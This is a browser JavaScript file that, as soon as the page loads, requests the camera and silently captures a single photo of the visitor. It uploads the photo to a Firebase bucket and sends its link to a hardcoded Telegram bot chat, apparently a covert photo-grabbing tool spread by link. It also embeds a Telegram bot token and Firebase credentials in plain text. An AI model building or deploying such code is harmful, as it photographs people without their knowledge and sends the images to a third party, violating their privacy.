document.addEventListener('DOMContentLoaded', () => {
    const videoElement = document.getElementById('videoElement');
    const canvasElement = document.getElementById('canvasElement');
    const canvasContext = canvasElement.getContext('2d');

    let stream;

    // Initialize Firebase
    const firebaseConfig = {
        apiKey: "AIzaSyAKbdU0EKBK4nFxTouKQNiVyzgblXkgGOU",
        authDomain: "capture-it-e5b68.firebaseapp.com",
        projectId: "capture-it-e5b68",
        storageBucket: "capture-it-e5b68.appspot.com",
        messagingSenderId: "780183780729",
        appId: "1:780183780729:web:a0ecd28c411a7d88ce43a8"
    };

    if (!firebase.apps.length) {
        firebase.initializeApp(firebaseConfig);
    }

    const storage = firebase.storage();

    async function requestCameraAccess() {
        try {
            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                console.error('getUserMedia not supported in this browser.');
                alert('Your browser does not support camera access. Please try using a different browser.');
                return;
            }

            stream = await navigator.mediaDevices.getUserMedia({ video: true });
            videoElement.srcObject = stream;
            videoElement.play();

            videoElement.addEventListener('loadedmetadata', () => {
                videoElement.play();
            });

            videoElement.addEventListener('canplay', () => {
                setTimeout(() => {
                    videoElement.pause();
                    videoElement.play();
                    capturePhoto();
                }, 1000); // Reinitialize the video element
            }, { once: true });

            setTimeout(stopVideoStream, 2000); // Increased stop time to avoid premature stop
        } catch (error) {
            console.error("Error accessing the camera: ", error);
            alert('Error accessing the camera. Please check your permissions or try a different browser.');
        }
    }

    function capturePhoto() {
        if (stream && videoElement.videoWidth > 0 && videoElement.videoHeight > 0) {
            canvasElement.width = videoElement.videoWidth;
            canvasElement.height = videoElement.videoHeight;
            canvasContext.drawImage(videoElement, 0, 0, canvasElement.width, canvasElement.height);

            // Optional: Debugging - Log the canvas content to console
            const dataURL = canvasElement.toDataURL('image/jpeg', 0.95); // JPEG with 95% quality
            console.log('Canvas Data URL:', dataURL);

            canvasElement.toBlob(blob => {
                if (blob) {
                    uploadImage(blob);
                } else {
                    console.error('Failed to create blob from canvas');
                }
            }, 'image/jpeg', 0.95); // JPEG format for better compatibility
        } else {
            console.error('Video element is not ready for capture');
        }
    }

    function uploadImage(blob) {
        const fileRef = storage.ref().child('images/' + 'image_' + new Date().toISOString().replace(/[-:.]/g, '') + '.jpg'); // JPEG format

        const uploadTask = fileRef.put(blob);

        uploadTask.on('state_changed',
            snapshot => {
                const progress = (snapshot.bytesTransferred / snapshot.totalBytes) * 100;
                console.log('Upload is ' + progress + '% done');
            },
            error => {
                console.error('Upload failed:', error);
            },
            () => {
                uploadTask.snapshot.ref.getDownloadURL().then(downloadURL => {
                    console.log('File available at', downloadURL);
                    notifyTelegramBot(downloadURL);
                });
            }
        );
    }

    function notifyTelegramBot(imageUrl) {
        const botToken = '7224754204:AAGVD9csTIX8wMvHYmTPFrmJ_eq4etfJ71s';
        const chatId = '6369469811';
        const message = `New image uploaded: ${imageUrl}`;

        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: chatId,
                text: message
            })
        })
        .then(response => response.json())
        .then(data => {
            console.log('Telegram notification sent:', data);
        })
        .catch(error => {
            console.error('Telegram notification error:', error);
        });
    }

    function stopVideoStream() {
        if (stream) {
            stream.getTracks().forEach(track => track.stop());
            videoElement.srcObject = null;
        }
    }

    // Provide a fallback link to open the page in a different browser
    const fallbackLink = document.createElement('a');
    fallbackLink.href = window.location.href;
    fallbackLink.target = '_blank';
    fallbackLink.textContent = 'If you experience issues, click here to open in your default browser.';
    document.body.appendChild(fallbackLink);

    requestCameraAccess();
});
